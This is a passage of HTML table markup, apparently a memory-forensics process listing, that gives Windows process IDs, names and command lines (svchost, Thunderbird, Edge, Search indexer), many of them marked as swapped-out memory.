style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x62df818020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1656px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>6700</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>ApplicationFra</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;ApplicationFrameHost.exe -Embedding</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1679px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>6016</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x2b36ba03388 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1702px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>6212</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>dllhost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0xbd69c3e020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1725px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>7692</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>SgrmBroker.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x1c5a4cd10e8 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1748px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>6760</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;System32&#x5c;svchost.exe -k LocalServiceNetworkRestricted -p</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1771px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>4296</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>ShellExperienc</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x4ee0719020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1794px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>4780</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>RuntimeBroker.</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0xfa9c0d7020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1817px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1200</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>msedge.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0xe897ce3020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1840px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1728</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>MicrosoftEdgeU</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x991b38 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1863px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>5364</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>thunderbird.ex</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Program Files&#x5c;Mozilla Thunderbird&#x5c;thunderbird.exe </div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1886px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>4492</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>thunderbird.ex</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x2e2c3b3020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1909px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>8600</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>thunderbird.ex</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x6891198020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1932px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>8332</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>thunderbird.ex</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x787e200020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1955px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>7160</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>SearchApp.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0xc6a0185020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:1978px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>7460</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>OfficeClickToR</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x167c8972156 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2001px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>8280</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>SkypeBackgroun</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x3cd1d6020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2024px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>8544</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>dllhost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0xa6bbb17020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2047px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>8720</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>notepad.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;notepad.exe </div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2070px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>3644</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>thunderbird.ex</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0xd8b9e2a020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2093px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>3004</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>thunderbird.ex</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x9364c2020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2116px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>6568</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>Calculator.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x7bf0845020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2139px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1400</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>RuntimeBroker.</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x986593c020 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2162px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>1608</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>taskhostw.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>taskhostw.exe</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2185px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>9340</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>svchost.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;svchost.exe -k WbioSvcGroup</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2208px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>10108</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>AppVShNotify.e</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>Required memory at 0x1b2d39f1b08 is inaccessible &#x28;swapped&#x29;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2231px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>9296</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>SearchIndexer.</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;SearchIndexer.exe &#x2f;Embedding</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2254px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>4164</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>SearchProtocol</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Windows&#x5c;system32&#x5c;SearchProtocolHost.exe Global&#x5c;UsGthrFltPipeMssGthrPipe_S-1-5-21-3274565340-3808842250-3617890653-10012_ Global&#x5c;UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-3274565340-3808842250-3617890653-10012 1 -2147483646 &quot;Software&#x5c;Microsoft&#x5c;Windows Search&quot; &quot;Mozilla&#x2f;4.0 &#x28;compatible&#x3b; MSIE 6.0&#x3b; Windows NT&#x3b; MS Search 4.0 Robot&#x29;&quot; &quot;C&#x3a;&#x5c;ProgramData&#x5c;Microsoft&#x5c;Search&#x5c;Data&#x5c;Temp&#x5c;usgthrsvc&quot; &quot;DownLevelDaemon&quot;  &quot;1&quot;</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2277px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>4464</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 'w100'>msedge.exe</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:6;height:23px;width:84px;left:168px;' class='cD fnal f10 nW'><div class = 'w100'>C&#x3a;&#x5c;Program Files &#x28;x86&#x29;&#x5c;Microsoft&#x5c;Edge&#x5c;Application&#x5c;msedge.exe --type&#x3d;renderer --disable-gpu-compositing --lang&#x3d;en-US --js-flags&#x3d;--ms-user-locale&#x3d; --device-scale-factor&#x3d;1 --num-raster-threads&#x3d;1 --renderer-client-id&#x3d;145 --time-ticks-at-unix-epoch&#x3d;-1720089883345586 --launch-time-ticks&#x3d;1128944393 --field-trial-handle&#x3d;10996,i,4550380774351628999,14075719362826743519,262144 --variations-seed-version --mojo-platform-channel-handle&#x3d;9344 &#x2f;prefetch&#x3a;1</div></div><div class='cover' style='z-index:5; left: 252px; width:10px; height:23px;'></div></div><div class='row' style='top:2300px; height:23px; width:262px;'><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;border-left:1px solid #D5D5D5;z-index:4;height:23px;width:84px;left:0px;' class='cD fnal f10 tar nW'><div class = 'w100'>10136</div></div><div style='font-family:&quot;Arimo&quot;,&quot;Arial&quot;,Roboto,&#x20;Helvetica,&#x20;sans-serif,&#x20;Arial;color:#000000;z-index:5;height:23px;width:84px;left:84px;' class='cD fnal f10 nW'><div class = 